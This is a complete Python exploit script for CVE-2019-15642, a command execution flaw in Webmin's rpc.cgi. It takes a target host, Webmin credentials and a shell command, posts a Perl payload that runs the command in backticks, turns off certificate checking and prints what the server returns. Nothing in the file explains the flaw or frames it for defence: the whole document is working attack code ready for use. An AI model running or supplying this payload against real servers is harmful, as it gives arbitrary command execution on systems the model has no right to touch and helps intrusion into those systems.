from requests import post
from urllib3 import disable_warnings
from base64 import b64encode
import re
import sys
import argparse


def CVE_2019_15642(url, base64_authentication, cmd):
    url += "/rpc.cgi"
    payload = r'OBJECT Socket; print "Content-Type: text/plain\n\n";$cmd=`%s`; print "$cmd\n\n";' % cmd
    headers = {
        "User-Agent": "webmin",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic %s" % base64_authentication,
        "Content-Length": str(len(payload) + 4)
    }

    request = post(url=url, data=payload, headers=headers, verify=False)
    print(request)
    if request.status_code == 200 and "Content-type" in request.text:
        message = re.findall(r"(.+?)\nContent-type: text/plain", request.text, re.S)
        if len(message) > 0:
            print(message[0])
    else:
        print("Vulnerability not found")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", dest="host", required=True, help="Webmin url")
    parser.add_argument("--port", dest="port", default=10000, required=False, help="Webmin port (default: 10000)")
    parser.add_argument("-u", "--user", dest="user", required=True, help="Webmin user")
    parser.add_argument("--pass", dest="password", required=True, help="Webmin user password")
    parser_group = parser.add_mutually_exclusive_group(required=True)
    parser_group.add_argument("-c", "--command", dest="command", help="Command to execute")

    try:
        args = parser.parse_args()
    except:
        parser.print_help()
        sys.exit(0)

    disable_warnings()

    URL = "https://" + args.host + ":" + str(args.port)
    CMD = args.command
    USERNAME = args.user
    PASSWORD = args.password

    auth = b64encode(bytes(USERNAME + ":" + PASSWORD, "ascii")).decode()
    CVE_2019_15642(URL, auth, CMD)


main()
